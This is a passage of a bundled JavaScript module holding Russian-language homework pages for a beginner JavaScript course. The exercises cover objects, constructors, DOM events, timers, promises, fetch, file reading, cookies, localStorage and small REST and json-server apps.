**~name~** (строка)\n![ico-20 green-ok] **~registered~** (логическое значение)\n![ico-20 green-ok] **~data~** (дата в формате "dd.mm.yy")\n\nДобавьте каждому объекту метод **~getInfo~**, который будет ссылкой на функцию **~userInfo~**.\n\nВызовите каждый метод.\n\n_____________________\n\n## ![ico-30 exelent] Great\n\nЕсть три объекта: **~users~**, **~posts~** и **~comments~**\n\n(готовые объекты уже ждут вас по [![ico-20 link] **ссылке**](samples/02))\n\n![](illustrations/hw-03-1.png)\n\nНаписать код функции **~getPostComments~** (_~postId~_),\n\nкоторая возвращает массив всех комментариев к посту с идентификатором  _~postId~_\n\n(с именем автора комментария и текстом комментария)\n\n![](illustrations/hw-03-2.png)\n\n**Result:**\n\n![](illustrations/hw-03-3.png)\n'},59968:(n,e,_)=>{"use strict";_.r(e),_.d(e,{default:()=>t});const t="# ![ico-40 hw] Homework\n\n## ![ico-40 require] Satisfactorily\n\nСоздайте объект, свойства которого описывают содержимое дамской сумочки\n• Создайте метод объекта, позволяющий удалить что-то из сумочки\n• Создайте метод объекта, позволяющий положить что-то в сумочку\n\n________________________________________\n\n## ![ico-30 good] Fine\n\nОбъявить конструктор **LibraryBook**, с помощью которого можно создавать и редактировать объекты, хранящие информацию о книгах в библиотеке\n\n^^^[Приватные свойства объекта]\n• **title** (название книги),\n• **year** (год издания),\n• **author** (автор),\n• **readerName** (кому выдана),\n• **readerData** (когда выдана)\n^^^\n\n^^^[Приватный метод giveTheBook (client)]\nвнесение изменений в свойства:\n• **readerName** / client /\n• **readerData** / текущая дата /\n^^^\n\n^^^[Публичные методы]\n• **getBookInfo()** - посмотреть информацию о наличии книги\n^^(вывести в консоль ~readerData~)^^\n• **getTheBook(_client_)** -  получить книгу:\n^^проверка, что книга не выдана на руки^^\n^^(приватное свойство ~readerName~ должно быть пустой строкой)^^\n^^если выдана - вернуть ~null~^^\n^^если не выдана, то вызвать приватный метод ~giveTheBook (client)~ и вернуть ~bookTitle~^^\n• **returnBook()** - вернуть книгу:\n^^сбросить значения приватных свойств ~readerName~, ~readerData~^^\n^^^\n\nСоздайте экземпляр книги\nЗапросите экземпляр от имени ... (любое имя)\n\nЕсли будет слишком трудно, изучаем [![ico-20 cap] **пример**](samples/10)\n\n![ico-25 hw] Debug\n\n![](illustrations/hw-04-1.png)\n\nУстановите _breakpoints_\nМожете добавить в ![ico-20 search] **Watch**  переменные ~title~, ~year~, ~author~, ~readerName~, ~readerData~\n![ico-20 search] Mожно отслеживать изменение значений переменных еще и  в разделе  **Scope** дебаггера:\n    _Local_ - локальные переменные исполняемой функции,\n    _Block_ - переменные контекста вызова\n\n![](illustrations/hw-04-2.png)\n\nСледите, какая функция сейчас выполняется, в разделе **Call Stack**\n    ![ico-25 reload] После установки breakpoints перезагрузите страницу\n    ![ico-20 yes] Не забывайте пошагово запускать выполнение кода\n    ![ico-20 search] В консоли отслеживайте результаты работы кода\n\n____________________________________\n\n## ![ico-30 exelent] Great\n\nОбъявите конструктор, который создает экземпляры с унаследованным методом **~addProperty~**\n\nМетод **~addProperty~** должен принимать два аргумента:\n\n• имя свойства\n• значение свойства\n\nи добавлять экземпляру новое свойство с указанным именем и значением\n"},99399:(n,e,_)=>{"use strict";_.r(e),_.d(e,{default:()=>t});const t="# ![ico-40 hw] Homework\n\n## ![ico-40 require] Satisfactorily\n\nНапилить код функции **~modificator~**, такой, чтобы в результате работы кода:\n\n~~~js\nfunction sampleFunc () {\n  console.log(`${arguments.callee.name}: ${arguments[0]} | ${arguments[1]}`)\n}\n\nfunction modificator (func) {\n  ...\n}\n\ntestFunc = modificator(sampleFunc)\n\ntestFunc()\n~~~\n\nв консоли было:\n\n~~~console\nsampleFunc: test | sample\n~~~\n\n______________________\n\n## ![ico-30 good] Fine\n\nНапилить код функции **~modificator~**, такой, чтобы в результате работы кода:\n\n~~~js\nfunction sampleFunc () {\n  console.info(`Symbols in my code: ${arguments.callee + 0}`)\n}\n\nfunction modificator (func) {\n    ...\n}\n\nmodificator(sampleFunc)\n\nsampleFunc()\n~~~\n\nв консоль было выведено число символов в коде функции **~sampleFunc~**, т.е.:\n\n~~~console\nSymbols in my code: 93\n~~~\n\n_______________\n\n## ![ico-30 exelent] Great\n\nНапилите код функции **~generateError~**, такой, чтобы в результате работы кода:\n\n~~~js\nfunction testArguments () {\n  function generateError (numArgs) {\n    ...\n  }\n  try {\n    arguments.length >= 3 ? null : generateError(arguments.length)\n  } catch (err) {\n    console.error(`${err.name}: ${err.message}\\n${err.stack}`)\n  }\n}\n\ntestArguments('Google')\n~~~\n\nв консоли было сообщение от ошибке:\n\n~~~console\n► Application: Invalid arguments\nFunction needs 3 arguments, but only 1 present\n~~~\n"},4238:(n,e,_)=>{"use strict";_.r(e),_.d(e,{default:()=>t});const t="# ![ico-40 hw] Homework\n\n## ![ico-40 require] Satisfactorily\n\nСоздайте массив **~tags~** с именами валидных тегов HTML5\n\nТеперь создайте массив **~classes~** с именами классов\n\n(число элементов в массиве **~classes~** должно быть не меньше, чем число элементов массива **~tags~**)\n\nСоздайте элемент **_~style~_** и вставьте его в **~head~** документа\n\nДобавьте контент элемента **_~style~_** с описанием классов, имена которых находятся в массиве **~classes~**\n\nИтерируйте массив **~tags~**, создавая соответствующие элементы и вставляя их на страницу, добавляя каждому элементу класс из массива **~classes~**\n\n_______________________________________\n\n## ![ico-30 good] Fine\n\nРезультат должен быть аналогичен тому, что получится в предыдущем упражнении\n\nОднако исходный массив **~tags~** должен быть массивом объектов, каждый из которых содержит не только имя тега элемента, но и его атрибуты, а так же хотя бы один обработчик события\n\nТаким образом, массив **~classes~** нам уже не нужен, но кроме стилизации элементов нужно еще добавить их контент, используя как атрибуты тегов, так и свойства элементов DOM\n\n_________________________________________\n\n## ![ico-30 exelent] Great\n\nНапилить код, который выбирает все элементы-потомки **~body~** (![ico-20 warn] кроме элементов **~script~**) и добавляет им класc:\n\n~~~css\n.redBack {\n  background-color: red!important;\n}\n~~~\n\nАльтернативный вариант - выбрать все заранее заданные элементы:\n\n~~~js\nvar tags = ['header', 'footer', 'main', 'div', 'p']\n~~~\n\nЗапустить код в консоли любой страницы\n\nПодсказка: используйте методы объекта [**~classList~**](external/mdn-class-list)\n\n_________________\n\n[![ico-30 link-ico]](help/hw-06-3-answer)\n"},11629:(n,e,_)=>{"use strict";_.r(e),_.d(e,{default:()=>t});const t="# ![ico-40 hw] Homework\n\n## ![ico-40 require] Satisfactorily\n\n![ico-25 warn] pure JS\n\nСоздайте элемент ~** p**~, при клике на котором появляется картинка размером 100px.\n\nПри наведении указателя мышки на картинку ее размер должен плавно увеличиваться до 200px.\n\nПри клике на картинке она должна исчезать.\n\n______________________\n\n## ![ico-30 good] Fine\n\nСоздайте коллекцию вложенных друг в друга html-элементов с обработчиками событий **~click~**, **~mouseover~**, **~mouseout~**\n\n~~~js\nvar collection = []\n\nfunction over (event) {\n  ...\n}\nfunction out (event) {\n  ...\n}\nfunction clickHandler (event) {\n  ...\n}\n\n;['first', 'second', 'third', 'fourth']\n  .forEach(function (tag, index, arr) {\n    ...\n  })\n~~~\n\nУстановите атрибуты стиля **~width~** и **~height~** такие, чтобы вложенные элементы были меньше размером, чем родитель.\n\nУстановите значение **_~#ff00ff50~_** атрибута **~background-color~** каждому элементу.\n\nУстановите значение **_~dotted 1px yellow;~_** атрибута **~border~** каждому элементу.\n\nПри наступлении события **~mouseover~** значение атрибута **~background-color~** должно меняться на **_~#ffff0050~_**.\n\nПри наступлении события **~mouseout~** атрибуту **~background-color~** должно устанавливаться исходное значение.\n\nПри наступлении события **~click~** элемент должен быть удален.\n\nПри наведении мышки на элемент должна появляться подсказка с его именем (\"first\", \"second\", \"third\", \"fourth\").\n\n_______________________\n\n## ![ico-30 exelent] Great\n\nУсловия предыдущего задания изменить так:\n\n~~~js\nvar collection = []\n\nfunction enter (event) {\n  ...\n}\nfunction leave (event) {\n  ...\n}\nfunction clickHandler (event) {\n  ...\n}\n\n;[1, 2, 3, 4, 5, 6, 7].forEach(...)\n~~~\n\n![ico-20 warn] при удалении элемента его потомки должны оставаться.\n\n________________________________\n\n[![ico-30 link-ico]](help/hw-07-answers)\n"},57972:(n,e,_)=>{"use strict";_.r(e),_.d(e,{default:()=>t});const t="# ![ico-40 hw] Homework\n\n## ![ico-40 require] Satisfactorily\n\nНапилите код, выводящий на страницу текущее время в течение 100 секунд\n\n^^^[Подсказка]\n\nсоздайте элемент, в котором будет отображаться текущее время\nКонтент элемента должен обновляться каждую секунду\n\n^^^\n\n___________________\n\n## ![ico-30 good] Fine\n\nЗавершите код **_рекурсивной_** функции **~typeMessage~** так, чтобы при ее вызове на страницу выводился один символ в секунду\n\n~~~js\nvar typeMessage = (function (velocity) {\n  var container = demo\n    ? demo\n    : document.body.appendChild(document.createElement('h3'))\n\n  container.style = 'color: magenta;'\n  container.id = 'demo'\n\n  var index = 0\n\n  return function (message) {\n    ...\n  }\n})(1)\n\ntypeMessage(`Welcome to the hell`)\n~~~\n_________________________\n\n## ![ico-30 exelent] Great\n\nНужно сделать так, чтобы у всех экзепляров, созданных конструктором **User**, был унаследованный метод **_~counter()~_**, который считает созданные конструктором экземпляры.\n\nКаждый вызов конструктора увеличивает счетчик экземпляров на 1 и помещать новое значение счетчика в свойство **~id~** созданного экземпляра:\n\n~~~js\nfunction User (name) {\n  this.name = name\n  this.id = this.counter()\n}\n\n...\n\nvar users = [\n  new User('Piter'),\n  new User('Antony'),\n  new User('Robert'),\n  new User('Gregory')\n]\n~~~\n\n![ico-20 warn] После выполнения кода:\n\n~~~js\nusers[1].id = users[1].counter()\n~~~\n\nсвойство **~id~** экземпляра не должно измениться, так же, как и значение счетчика\n\n________________________________\n\n[![ico-30 link-ico]](help/hw-08-answers)\n"},22571:(n,e,_)=>{"use strict";_.r(e),_.d(e,{default:()=>t});const t="# ![ico-40 hw] Homework\n\n## ![ico-40 require] Satisfactorily\n\nЗавершите код функции **~typeMessage~** так, чтобы на страницу выводился один символ в секунду\n\n~~~javascript\nfunction typeMessage (message, velocity) {\n  var container = document.getElementById('demo')\n    ? document.getElementById ('demo')\n    : document.body.appendChild(document.createElement('h3'))\n    container.style = `color: magenta;`\n    ...\n}\n\ntypeMessage('Welcome to the hell', 1)\n~~~\n\n___________________\n\n## ![ico-30 good] Fine\n\nНапилите код методов **~setUserPresent~**, **~showPresent~** и **~showAbsent~**\n\n~~~js\nvar users = (function (list) {\n  var users = []\n  for (var user of list) users.push({ name: user, present: false })\n\n  return {\n    setUserPresent (userName, present) {\n      ...\n    },\n    showPresent () {\n      ...\n    },\n    showAbsent () {\n      ...\n    }\n  }\n})(['Robert', 'Stephan', 'Fred', 'Piter'])\n\nusers.showAbsent()\n~~~\n\nПосле запуска кода результат в консоли должен быть таким:\n\n~~~console\nRobert\nStephan\nFred\nPiter\n~~~\n\nа после выполнения кода:\n\n~~~js\nusers.setUserPresent('Robert', '+')\nusers.setUserPresent('Piter', 'присутствовал')\nusers.setUserPresent('Fred', true )\n\nusers.showPresent()\n~~~\n\nрезультат в консоли должен быть таким:\n\n~~~console\nRobert\nPiter\nFred\n~~~\n_________________________\n\n## ![ico-30 exelent] Additional\n\nДопилите код функции **~changeClass~**, которая парсит все стили страницы в поисках заданного класса, а затем меняет атрибуты стиля этого класса\n\n~~~js\nvar changeClass = (classname, styleString) => (...).length > 0\n  ? console.log('found')\n  : document.head.appendChild(document.createElement('style'))\n      .textContent = `.${classname} {${styleString}}`\n~~~\n\nПосле вызова функции:\n\n~~~js\nchangeClass('second-level-menu', 'background-color: red!important;')\n~~~\n\nв консоли страницы, где есть элементы с классом **~second-level-menu~**, у всех элементов этого класса цвет фона должен измениться на красный\n\n________________________________\n\n[![ico-30 link-ico]](help/hw-09-answers)\n"},40873:(n,e,_)=>{"use strict";_.r(e),_.d(e,{default:()=>t});const t="# ![ico-40 hw] Homework\n\n## ![ico-40 require] Satisfactorily\n\nЛогирование поступающих сообщений в объекте **~log~**\n\nЗадан массив сообщений и пустой объект **~log~**:\n\n~~~js\nvar messages = [\n  'backspace',\n  'enter',\n  'shift',\n  'control',\n  'delete',\n  'space',\n  'subtract'\n]\n\nvar log = {}\n~~~\n\nДалее, есть функция, отправляющая сообщения в случайном порядке в случайное время:\n\n~~~js\nvar sendMessage = (message, callback) => setTimeout(() => callback(message), Math.random() * 7000)\n~~~\n\nОбратите внимание, что эта функция получает при вызове не только текст сообщения, но и колбэк-функцию, которой нужно передать это сообщение\n\nС помощью кода:\n\n~~~js\nmessages.forEach(message => sendMessage(message, handler))\n~~~\n\nинициируем отправку сообщений\n\n![ico-25 warn]\n\nВаша задача - напилить код функции **~handler~**,\nкоторая получает сообщение и заносит его в объект **~log~**\nв виде нового свойства,\nзначение которого - текст поступившего сообщения,\nа ключ (имя свойства) - это время поступления сообщения (в виде строки).\n\n**log**\n~~~console\n{\n    19:34:08: \"control\"\n    19:34:08[2]: \"backspace\"\n    19:34:09: \"subtract\"\n    19:34:09[2]: \"enter\"\n    19:34:11: \"delete\"\n    19:34:11[2]: \"shift\"\n}\n~~~\n\nВ помощь вам уже есть функция, которая формирует ключ очередного сообщения:\n\n~~~js\nvar getKey = () => {\n  var key = new Date().toLocaleString().split(', ')[1]\n  return log[key] ? key + '[2]' : key\n}\n~~~\n\nНа случай, если два сообщения поступят одновременно, функция **~getKey~** добавляет \"[2]\" к значению ключа (иначе значения ключей двух сообщений будут совпадать)\n\n____________________________________________________________________________\n\n## ![ico-30 good] Fine\n\nДопилите код конструктора **User**, дополнив его акцессорами приватного свойства **~presence~** так, чтобы после выполнения скрипта:\n\n~~~js\nfunction User (name) {\n  this.name = name\n  var presence = false\n  ...\n}\n\nvar user = new User('Ivan')\nconsole.info(user.presence)\n~~~\n\nв консоли было: ~\"Ivan is absent\"~\n\nа после выполнения кода:\n\n~~~js\nuser.presence = '+'\nconsole.info(user.presence)\n~~~\n\nв консоли было: ~\"Ivan is present\"~\n\n_______________________________________________________________________________\n\n## ![ico-30 exelent] Great\n\nОбъявить функцию-конструктор **User**.\n\n![ico-20 warn] Конструктор должен принимать аргументы, описывающие юзера.\n\n### ![ico-20 file] Статические свойства конструктора\n\nУ конструктора должны быть следующие ![ico-20 warn] не наследуемые экземплярами свойства и методы:\n\n![ico-20 green-ok] **avatars** (_массив_)\n\n~~~~avatars\n[\n  'https://pre00.deviantart.net/50f9/th/pre/i/2011/217/e/8/pikachu_2_by_nostalgiaattack-d45jd3i.png',\n  'https://cdn.diversityavatars.com/wp-content/uploads/2018/01/Vector-Smart-Object-5.png',\n  'https://cdn4.iconfinder.com/data/icons/user-avatar-flat-icons/512/User_Avatar-31-512.png',\n  'http://icons.iconarchive.com/icons/hopstarter/face-avatars/256/Male-Face-L3-icon.png',\n  'https://findicons.com/files/icons/1072/face_avatars/300/i05.png',\n  'http://www.iconarchive.com/download/i51043/hopstarter/halloween-avatars/Gomez.ico',\n  'http://icons.iconarchive.com/icons/hopstarter/halloween-avatars/256/Zombie-2-icon.png',\n  'https://vignette.wikia.nocookie.net/yogscast/images/8/8a/Avatar_Turps_2015.jpg'\n]\n~~~~\n\n__________________\n\n![ico-20 green-ok] **admin** (_объект_)\n\n~~~js\n{\n  photoURL: 'https://i.pinimg.com/originals/3d/47/4f/3d474f82ff71595e8081f9a120892ae8.gif',\n  name: 'admin'\n}\n~~~\n\n@@@@ 4\n![](https://i.pinimg.com/originals/3d/47/4f/3d474f82ff71595e8081f9a120892ae8.gif)\n\nАдмин пишет непосредственно в **_messageBox_**\n@@@@\n\n_____________________\n\n![ico-20 green-ok] **getAvatar** (_метод_)\n\nвозвращает извлеченный из массива **avatars** элемент\n\n~~~js\nreturn this.avatars.shift()\n~~~\n\n__________________\n\n### ![ico-20 file]  Собственные свойства экземпляров\n\n| ![ico-20 green-ok] **_name_** | ^^имя пользователя^^ |\n| ![ico-20 green-ok] **_email_** | ^^email пользователя^^ |\n| ![ico-20 green-ok] **_photoURL_** | ^^URL фотографии пользователя^^ |\n\nКонструктор должен иметь дефолтные значения для всех аргументов\nДефолтное значение URL фотографии пользователя должно быть результатом работы статического метода ~getAvatar~\n\n___________________\n\n### ![ico-20 file] Унаследованные свойства экземпляров\n\n![ico-20 green-ok] **неперечислимое неизменяемое** свойство **~messageBox~** (_элемент DOM_)\n\nконтейнер, куда будут выводиться сообщения всех пользователей и ~admin~\nпри выводе сообщения пользователя в ~messageBox~ должны отображаться его аватар и имя\n\n![ico-20 green-ok] унаследованные методы ~write~ и ~read~\n\n• запись осуществляется в ~messageBox~, чтение - из ~messageBox~\n\n_____________________\n\n### ![ico-20 file] start\n\nПосле того, как конструктор будет объявлен, выполните код в консоли:\n\n~~~~js\nvar users = [\n  new User('Frodo'),\n  new User('Alex', 'alex@gmail.com'),\n  new User('Bob', 'bob777@gmail.com'),\n  new User('Tom', 'tom888@gmail.com'),\n  new User('Fima', 'fima999@gmail.com')\n]\n\nvar k = 1\nusers.forEach(function (user) {\n  setTimeout(function () {\n    user.write(`Hello, I'm ${user.name}`)\n  }, 3000 * k++)\n})\n~~~~\n\n__________________________\n\n![ico-20 pin] Короче, юзеры пишут в **~messageBox~** из консоли:\n\n~~~js\nusers[index].write(text)\n~~~\n\nа вот admin непосредственно вводит текст в **~messageBox~**\n\n^^(т.е. при вводе в **messageBox** пишущий сообщение идентифицируется как админ, выводится его аватар и имя)^^\n\n________________________\n\n[![ico-20 cap] Что примерно должно получиться](samples/12)\n^^(не смотрите код сразу, попробуйте сами)^^\n"},39786:(n,e,_)=>{"use strict";_.r(e),_.d(e,{default:()=>t});const t="# ![ico-40 hw] Homework\n\n## ![ico-40 require] Satisfactorily\n\n![ico-25 warn] Предварительная подготовка:\n\nСоздать файл с данными в формате JSON.\n\nЭто должен быть массив объектов с двумя свойствами:  **~title~** и  **~ref~**.\n\n![ico-20 green-ok] **~title~** - название картинки.\n![ico-20 green-ok] **~ref~** - ссылка на картинку.\n\n![ico-25 pin] Задание:\n\n• Загрузить данные из JSON-файла.\n• Распарсить данные в массив.\n• Вывести на страницу картинки и подписи к ним.\n\n____________________________\n\n## ![ico-30 good] Fine\n\n![ico-25 file] Исходные данные\n\n~~~~js\nvar messages = [\n  'backspace',\n  'enter',\n  'shift',\n  'control',\n  'delete',\n  'space',\n  'subtract'\n]\n\nmessages.getKey = () => {\n  var key = new Date().toLocaleString().split(', ')[1]\n  return log[key] ? log[key + '[2]'] ? key + '[3]' : key + '[2]' : key\n}\n\nvar log = {}\n~~~~\n\n![ico-25 file] sendMessage\n\n~~~js\nvar sendMessage = message => new Promise(resolve => setTimeout(() => resolve(message), Math.random() * 7000))\n~~~\n\nЗадача: напилить код, который вызывает функцию **~sendMessage~** для каждого элемента массива **~messages~** и логирует полученные сообщения в объекте **~log~** следующим образом:\n\n**log**\n~~~console\n{\n  22:25:57: \"backspace\"\n  22:25:58: \"shift\"\n  22:25:59: \"subtract\"\n  22:25:59[2]: \"enter\"\n  22:25:59[3]: \"delete\"\n  22:26:01: \"control\"\n  22:26:01[2]: \"space\"\n}\n~~~\n\n__________________________________\n\n## ![ico-30 exelent] Great\n\nИзменим условие предыдущего задания.\n\nМассив **~messages~**, объект **~log~** и функция **~sendMessage~** остаются теми же.\n\nНемного изменится метод **~getKey~**:\n\n~~~js\nmessages.getKey = () => new Date().toLocaleString().split(', ')[1]\n~~~\n\nНужно напилить код рекурсивной функции **~recursive~**, которая вызывает **~sendMessage~** поочередно с каждым элементом массива **~messages~**, но только после того, как предыдущий месседж будет залогирован в объекте **~log~**.\n\n~~~js\nvar sendAll = () => {\n  var index = 0\n  function recursive () {\n    ...\n  }\n  recursive ()\n}\n\nsendAll()\n~~~\n\n________________________________________________________________\n[![ico-30 link-ico]](help/hw-11-answers)\n"},28355:(n,e,_)=>{"use strict";_.r(e),_.d(e,{default:()=>t});const t='# ![ico-40 hw] Homework\n\n## ![ico-40 require] Satisfactorily\n\nЗахостить на гитхабе приложение, которое:\n\n• читает куки на клиенте, и если там есть дата последнего посещения, выводит ее на страницу.\n• пишет в куки на клиенте текущую дату посещения.\n\n___________________\n\n## ![ico-30 good] Fine\n\nОбъявить функцию, которая будет:\n\n• вызываться в момент изменения хэш-части адреса страницы.\n• сохранять в **localStorage** hash-часть адреса страницы как **~pageId~** и время входа (в секундах) как **~startTime~**.\n\nНазначить эту функцию обработчиком  события **~hashchange~**  объекта  ~window~.\n\n^^Желательно, чтобы при изменении хеш-части адреса происходило обновление контента страницы без перезагрузки^^\n^^(например, изменялся заголовок и картинка, чтобы создать иллюзию перехода на новую страницу).^^\n\n![](illustrations/sample-16.gif)\n\nОтслеживать в панели разработчика изменения в ~localStorage~.\n\n_________________________________\n\nПосле загрузки страницы меняйте хеш-часть адреса на 0, 1, 2, 3.\n\n![](illustrations/hw-12-1.png)\n\n[![ico-25 cap] **live demo**](samples/16)\n\n![](illustrations/hw-12-start.png)\n\nи наблюдайте изменения на странице и в ~localStorage~\n\n![](illustrations/hw-12-2.png)\n_________________________\n\n## ![ico-30 exelent] Great\n\n**Рулетка**\n\n@@@@\n^^Напилить код, который:<br>• вставляет кнопку **Spin the roulette** на страницу<br>• добавляет обработчика события **~click~** кнопки^^\n![](illustrations/hw-12-4.png)\n@@@@\n\n_________________________\n\n@@@@\n^^Обработчик события **~click~** кнопки **Spin the roulette**:<br><br>• прячет кнопку и добавляет на страницу картинку<br>• ждет 2,5 секунды, пока "крутится рулетка".<br>• вычисляет случайное целое число от 1 до 20000 и помещает его в переменную **~winner~**.^^\n![](illustrations/hw-12-roulette.gif)\n@@@@\n\n^^• делает fetch-запрос на гитхабовский API, чтобы получить данные юзера под номером **~winner~**.^^\n^^• плавно изменяет непрозрачность картинки до 0.^^\n^^• при получении ответа изменяет ~src~ картинки на аватарку юзера, а так же вставляет логин юзера под фотографией.^^\n^^• плавно изменяет непрозрачность картинки до 1.^^\n^^• ждет еще 10 секунд, прячет логин и аватар юзера, и делает видимой кнопку.^^\n\n[![ico-25 cap] **live demo**](samples/27)\n\n________________________________\n\n[![ico-30 link-ico]](help/hw-12-answers)\n'},64780:(n,e,_)=>{"use strict";_.r(e),_.d(e,{default:()=>t});const t="# ![ico-40 hw] Homework\n\n___________________________________________\n\n## ![ico-40 require] Satisfactorily\n\n**Blob**\n\nЗагрузить картинку из сети с помощью ~fetch~ в виде объекта ~Blob~.\nСоздать временную ссылку на полученный объект.\nРазместить изображение на странице.\n\n_____________________________________________________________\n\n## ![ico-30 good] Fine\n\nНапилить код функции **~testFile~**\n\n~~~js\nvar addElem = tagName => document.body.appendChild(document.createElement(tagName))\n\nvar selector = Object.assign(addElem('input'), {\n  type: 'file',\n  multiple: true,\n  id: 'select-images',\n  style: 'display: none;'\n})\n\nvar label = Object.assign(addElem('label'), {\n  htmlFor: 'select-images',\n  innerText: 'Select images'\n})\n\nvar readFile = file => new Promise(...)\n\nselector.onchange = function (event) {\n  for (var file of event.target.files) {\n    readFile(file)\n      .then(result => Object.assign(addElem('img'), { src: result }))\n      .catch(error => console.error(error))\n    }\n}\n~~~\n\n![ico-20 warn] Функция **~readFile~** должна проверять, является ли выбранный файл изображением, и если нет - выводить сообщение \"Выбранный файл не является изображением\".\n![ico-20 warn] Не забывайте про ограничение на размер отправляемых файлов.\n\n_______________________________\n\n## ![ico-30 exelent] Great\n\n\n| ![ico-20 green-ok] | Создать форму с полями: |\n|                    | • Заголовок сообщения |\n|                    | • Тест сообщения |\n|                    | • Иконка [Icons](https://www.webfx.com/tools/emoji-cheat-sheet/) |\n| ![ico-20 green-ok] | Добавить форму на страницу |\n| ![ico-20 green-ok] | Назначить обработчика события **~submit~** формы |\n\n\nОбработчик должен:\n\n![ico-20 pin] Создать объект класса **~FormData~**.\n![ico-20 pin] Передать в него введенные значения из формы.\n![ico-20 pin] Отправить данные формы на сервер.\n\n^^^[Endpoints]\n\n~~~js\nconst api = 'https://garevna-form-data.glitch.me'\n~~~\n\n![ico-20 link] **GET**\n~~~js\n${api}/forms/all\n\n${api}/forms/${userLogin}\n~~~\n\n\n![ico-20 link] **POST**, **PUT**, **PATCH**, **DELETE**\n~~~js\n${api}/form/${userLogin}\n~~~\n^^^\n\n______________________________________________________________________________\n\n[![ico-30 link-ico]](help/hw-13-answers)\n"},47357:(n,e,_)=>{"use strict";_.r(e),_.d(e,{default:()=>t});const t="# ![ico-40 hw] Homework\n\n## ![ico-40 require] Satisfactorily\n\nПройти [**Quiz**](quiz/async)\n\n__________________________________________\n\n## ![ico-30 good] Fine\n\nИспользуя **_асинхронную_** функцию, напилить код функции **~printString~**, выводящей строку на страницу по 1 символу в секунду.\n\n~~~js\nfunction printString (text, container) {\n  ...\n}\n~~~\n\nНе забывайте проверить существование на странице контейнера для вставки текста, и создание его в противном случае.\n\n~~~js\nconst demo = (container && container.nodeType === 1 ? container : document.body)\n  .appendChild(document.createElement('div'))\n~~~\n\nДля добавления символов в элемент **~container~** используйте методы **_~appendChild~_** и **_~document.createTextNode~_**\n\n~~~js\ndemo.appendChild(document.createTextNode(...))\n~~~\n\n______________________________\n\n## ![ico-30 exelent] Great\n\nНапилить код функции **~printString~**, выводящей строку на страницу по 1 символу в секунду, используя анонимную **_асинхронную рекурсивную_** функцию и **IIFE**\n\n~~~js\nfunction printString (text, container) {\n  ...\n}\n~~~\n\n_____________________________________\n\n[![ico-30 link-ico]](help/hw-14-answers)\n"},91870:(n,e,_)=>{"use strict";_.r(e),_.d(e,{default:()=>t});const t="# ![ico-40 hw] Homework\n\n[%%%![ico-30 link] REST API%%%](page/REST)\n\n## ![ico-40 require] Satisfactorily\n\n**endpoints**\n\n••https://json-server-with-router.glitch.me/users••\n\nЗахостить мини-приложение на гитхабе, которое позволяет:\n\n|  1 | Получить данные о всех юзерах в базе данных **~users~** | **GET** |\n|  2 | Добавить нового юзера в базу данных | **POST** |\n|  3 | Удалить добавленную запись | **DELETE** |\n\n^^Для выполнения задания необходимо сверстать страницу с набором кнопок^^\n^^Результаты операций должны отображаться на странице^^\n^^Для добавления нового юзера в базу данных нужно создать форму^^\n^^При добавлении нового юзера его фотографию нужно загружать с клиента и отображать на странице ( с предварительной проверкой, что выбранный файл является изображением, и что размер изображения не превышает 100Кб )^^\n\n![ico-20 warning] Не загружайте больших фотографий на сервер\n______________________________\n\n## ![ico-30 good] Fine\n\nРасширить функционал мини-приложения следующими операциями:\n\n|  4 | Заменить любую существующую запись полностью | **PUT** |\n|  5 | Заменить частично в любой записи значение отдельного поля | **PATCH** |\n|  6 | Добавить валидацию полей форм | |\n\n^^Для выполнения задания необходимо сверстать форму, которая заполняется данными выбранного юзера из базы данных^^\n^^После редактирования данных формы они должны сохраняться в базу данных^^\n\n______________________________\n\n## ![ico-30 exelent] Great\n\n7. Создать на основе предыдущего мини-приложения форму регистрации юзера\n8. Обеспечить ввод и повторный ввод пароля\n9. Обеспечить хеширование пароля и его сохранение в куки вместе с ~id~ юзера\n"},79927:(n,e,_)=>{"use strict";_.r(e),_.d(e,{default:()=>t});const t='# ![ico-30 hw] Homework\n\n## ![point-40 require] Satisfactorily\n\nНапилить код класса **~ClimaticZones~**,\n\nэкземпляры которого имеют собственное свойство **_~region~_**,\n\nи наследуют неперечислимое свойство **_~climates~_** следующего содержания:\n\n◘◘climates◘◘\n\n~~~js\n{\n  "Equatorial regions of Africa": "Equatorial",\n  "Equatorial regions of South America": "Equatorial",\n  "Equatorial regions of Oceania": "Equatorial",\n  "South and Southeast Asia": "Tropical monsoon",\n  "West and Central Africa": "Tropical monsoon",\n  "Northern Australia": "Tropical Monsoon",\n  "North Africa": "Tropical dry",\n  "Central Australia": "Tropical Dry",\n  "Mediterranean": "Mediterranean",\n  "South Coast of Crimea": "Mediterranean",\n  "South Africa": "Mediterranean",\n  "South Western Australia": "Mediterranean",\n  "Western California": "Mediterranean"\n  "Western parts of Eurasia": "Temperate maritime",\n  "Western North America": "Temperate Marine",\n  "Inland": "Temperate Continental",\n  "Eastern edge of Eurasia": "Moderate monsoon",\n  "Northern edges of Eurasia": "Subarctic",\n  "Northern edges of North America": "Subarctic",\n  "Water area of ​​the Arctic Ocean": "Arctic"\n}\n~~~\n\nСобственное свойство **_~region~_** может принимать одно из значений, перечисленных в унаследованном свойстве **_~climates~_**.\n\nУнаследованный метод **_~getClimate()~_** должен возвращать климат для региона, который указан в значении свойства **_~region~_**.\n\n___________________________________________________________________________________________________________________\n\n## ![ico-30 good] Fine\n\nЗаверните в оболочку класса свой чатик на json-server.\n\n_________________________________________________________________________________________________________________\n\n## ![ico-30 exelent] Great\n\nСоберите приложение.\n\nЗапустите json-server.\n\nОткройте index.html в нескольких вкладках.\n\nВ одной вкладке задаете вопрос.\n\nВ другой вкладке отвечаете.\n\nВопросы приведены в конце.\n\n◘◘index.html◘◘\n\n~~~html\n&lt;!DOCTYPE html>\n&lt;html>\n  &lt;head>\n    &lt;meta charset="utf-8">\n    &lt;title>REST API samples</title>\n    &lt;meta name="description" content="JSON server: Simple chat"/>\n    &lt;meta name="viewport" content="width=device-width, initial-scale=1.0" />\n    &lt;link rel="shortcut icon" href="chat/a-level-ico.png" type="image/x-icon">\n    &lt;link rel="stylesheet" href="main.css">\n  &lt;/head>\n\n  &lt;body>\n    &lt;script src = "index.js"><\/script>\n  &lt;/body>\n\n&lt;/html>\n~~~\n\n^^^[main.css]\n\n~~~css\n* { font-family: Arial, Roboto, monospace; }\n\n.input-message {\n  position: fixed;\n  bottom: 24px;\n  left: 3%;\n  right: 3%;\n  height: 80px;\n  width: 95%;\n  border: inset 1px;\n  padding: 8px 16px;\n  overflow: auto;\n}\n\n.chat-container {\n  position: fixed;\n  top: 3%;\n  bottom: 100px;\n  left: 3%;\n  right: 3%;\n  border: inset 1px;\n  padding: 8px 16px;\n  overflow: 